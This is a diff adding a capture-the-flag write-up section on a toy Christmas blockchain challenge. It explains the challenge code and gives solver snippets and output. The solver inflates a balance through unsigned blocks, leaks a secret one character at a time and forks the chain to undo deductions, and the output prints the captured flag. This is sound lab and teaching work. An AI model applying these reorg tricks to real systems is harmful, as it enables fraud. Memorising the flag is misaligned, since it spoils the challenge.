@@ -1186,7 +1186,227 @@ $ python sleigh.py
 Press ENTER to send shellcode payload to fifo...
 ```
 
-## Day 6 - 
+## Day 6 - Custom blockchain
+
+This challenge has multiple files and a lot more code. There area children, elves, the North Pole (or _Poole_) and of course Santa. Not being very familiar with blockchains, I used an LLM to do a first pass through the entire code and get an overview about what's happening. In retrospective, this was both good and bad. Good because I got a solution almost immediately, which solved about 85% of the puzzle, and bad because to solve the other 15% LLMs were going in circles, and I still had to go back and understand the logic well and figure out how to get the flag. Regardless, this is a very interesting challenge.
+
+### High-level architecture 
+
+There are four actors:
+
+🎄 North Poole (`north_poole.py`)
+A minimal blockchain node:
+* Maintains blocks, tx pool, balances
+* Uses PoW (difficulty = 16 → 4 hex zeros)
+* Tracks a “nice list” balance
+* Longest-chain wins (highest index)
+* No signatures on blocks (!)
+
+🎅 Santa (`santa.py`)
+* Scans the blockchain
+* Looks for confirmed letters
+* Only gifts children who are nice
+* Responds with normal gifts, secret characters or the flag
+
+🧝 Elves (`elf.py`)
+* Honest miners
+* Randomly add a child to the nice list
+* Avoid adding the same child repeatedly
+* Mine continuously
+
+👶 Children (`children.py`)
+* Childrean are children 😇
+* Randomly send signed “Dear Santa” letters
+* Ask for toys
+* Their letters go into the `tx` pool
+
+### Blockchain rules
+
+*Proof-of-Work*
+A block is valid if:
+```python
+sha256(block_json).startswith("0000")
+```
+
+*Longest chain wins*
+The best chain is the block with the highest index:
+```python
+def get_best_chain_block():
+    best_hash = None
+    best_index = -1
+    for blk_hash, blk in BLOCKS.items():
+        if blk["index"] > best_index:
+            best_index = blk["index"]
+            best_hash = blk_hash
+    return best_hash
+```
+
+
+*Balance system*
+Everyone starts with balance 1 and each block may include:
+```python
+"nice": "<child_name>"
+```
+Which increases the person's balance:
+```python
+balances[nice_person] += 1
+```
+Santa gives gifts only to nice children:
+```python
+balances[child] > 0
+```
+
+Anyone can mine a block and set nice = ANYONE. There is no signature, no authority check. The only limits are:
+* max 10 times per identity per chain
+* nice person cannot appear as `tx.src` in that same block
+
+### Santa's confirmation logic
+
+Santa only trusts letters in blocks that are:
+```python
+chain[:-REQUIRED_CONFIRMATION_DEPTH]
+```
+Where `REQUIRED_CONFIRMATION_DEPTH = 5`. So:
+* Letters must be 6 blocks deep
+* Recent blocks are ignored
+* This mimics Bitcoin-style confirmations
+
+### The secret
+At startup the pool script initialises a secret gift:
+```python
+SECRET_GIFT = os.urandom(16).hex()  # 32 hex chars
+```
+If a letter contains `secret index #N` Santa replies with `SECRET_GIFT[N]`. So we can exfiltrate the secret one character at a time.
+
+### The flag
+If a letter contains the entire secret string previously exfiltrated, Santa provides the flag:
+```python
+if SECRET_GIFT in letter["letter"]:
+    gift_value = FLAG_GIFT
+```
+
+### Plan
+* Inflate the nice balance to maximum (1 + 10) by mining 10 blocks and setting `hacker` as nice:
+```python
+for _ in range(10):
+  mine_block(nice_person="hacker")
+```
+
+Before moving on to the next step, remember a clean head before Santa gifts the secrets. It will be useful later:
+```python
+clean_head = get_head()["hash"]
+clean_index = get_head()["block"]["index"]
+```
+
+* Request the 32 secret characters
+```python
+for i in range(32):
+  n = send_letter(
+    f"Dear Santa,\n\nFor christmas this year I would like secret index #{i}"
+  )
+  nonce_map[n] = i
+```
+
+* Confirm the letters by mining 6 additional blocks, so letters will be >=5 blocks deep and Santa will trust them
+```python
+for _ in range(6):
+	mine_block()
+	time.sleep(1)
+```
+
+* Collect the 32 characters of the secret by scanning the `txpool` and mapping the gifts to the nonce of the requests:
+```python
+recovered = ["?"] * 32
+got = 0
+
+while got < 32:
+	txs = requests.get(f"{NORTH_POOLE}/txpool").json().get("txs", [])
+
+	cur = get_head()["hash"]
+	for _ in range(8):
+		blk = get_block(cur)
+		txs.extend(blk["txs"])
+		cur = blk["prev_hash"]
+
+	for tx in txs:
+		if tx.get("type") == "gift" and tx.get("dst") == MY_NAME:
+			req = tx["nonce"].replace("-gift", "")
+			if req in nonce_map:
+				idx = nonce_map[req]
+				if recovered[idx] == "?":
+					recovered[idx] = tx["gift"]
+					got += 1
+					print(
+						f"\rProgress: {''.join(recovered)} ({got}/32)",
+						end=""
+					)
+	time.sleep(2)
+```
+
+* Fork the chain from the clean head before Santa gifted the secret characters, and continue to mine until the fork becomes the best chain. This is easy because the elves have a random delay after mining each block:
+```python
+time.sleep(random.randint(10, 120))
+```
+Now a re-org happens and the nice balance is kept. WIthout the fork the balance would have been (1 + 10 - 32 = -21) and we would be stuck.
+
+* Ask for the flag:
+```bash
+$ python solver.py
+
+--- ⛏️ STEP 1: Mine nice balance buffer ---
+[+] Mined block 4 | TXs=2 | Nice=hacker
+[+] Mined block 5 | TXs=0 | Nice=hacker
+[+] Mined block 6 | TXs=0 | Nice=hacker
+[+] Mined block 7 | TXs=0 | Nice=hacker
+[+] Mined block 8 | TXs=0 | Nice=hacker
+[+] Mined block 9 | TXs=0 | Nice=hacker
+[+] Mined block 10 | TXs=0 | Nice=hacker
+[+] Mined block 11 | TXs=0 | Nice=hacker
+[+] Mined block 12 | TXs=0 | Nice=hacker
+[+] Mined block 13 | TXs=2 | Nice=hacker
+
+--- 📧 STEP 2: Request 32 secret characters ---
+
+--- ⛏️ STEP 3: Confirm letters ---
+[+] Mined block 14 | TXs=33 | Nice=None
+[+] Mined block 15 | TXs=1 | Nice=None
+[+] Mined block 16 | TXs=0 | Nice=None
+[+] Mined block 17 | TXs=0 | Nice=None
+[+] Mined block 18 | TXs=0 | Nice=None
+[+] Mined block 19 | TXs=0 | Nice=None
+
+--- 🎁 STEP 4: Collect secrets ---
+Progress: 34448de412c2c60bd2afb4a8c113c24c (32/32)
+[+] Secret recovered: 34448de412c2c60bd2afb4a8c113c24c
+
+--- 🌲 STEP 5: Mine fork until it becomes best ---
+[+] Mined block 14 | TXs=0 | Nice=None
+[i] Fork index=14, Head index=19
+[+] Mined block 15 | TXs=0 | Nice=None
+[i] Fork index=15, Head index=19
+[+] Mined block 16 | TXs=0 | Nice=None
+[i] Fork index=16, Head index=19
+[+] Mined block 17 | TXs=0 | Nice=None
+[i] Fork index=17, Head index=19
+[+] Mined block 18 | TXs=0 | Nice=None
+[i] Fork index=18, Head index=19
+[+] Mined block 19 | TXs=0 | Nice=None
+[i] Fork index=19, Head index=19
+[+] Mined block 20 | TXs=0 | Nice=None
+[i] Fork index=20, Head index=20
+[✓] Fork is now the active best chain
+[nice] after fork balances: {'alder': 2, 'ash': 1, 'aspen': 1, 'birch': 1, 'cedar': 2, 'cypress': 1, 'elm': 1, 'hacker': 10, 'hazel': 1, 'holly': 1, 'juniper': 1, 'laurel': 1, 'maple': 1, 'pine': 1, 'rowan': 1, 'santa': 2, 'spruce': 1, 'willow': 0}
+[nice] after fork hacker balance: 10
+
+--- 🎅 STEP 6: Request FLAG ---
+
+--- 🎁 STEP 7: Waiting for FLAG gift ---
+🏁 FLAG: 3
+.....
+🏁 FLAG: pwn.college{ohENUI7kBHILv-h1IFOZfDPnPzp.QX0ETOxIDLzQDMyQzW}
+```
+
+## Day 7 - Warm-up gatekeeper
 
 <div class="box-note">
 Note that <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/out-string?view=powershell-6" target="_blank">Out-String -Stream</a> is very important here. This is needed to be able to use <b>Select-String</b> and grep through the output!
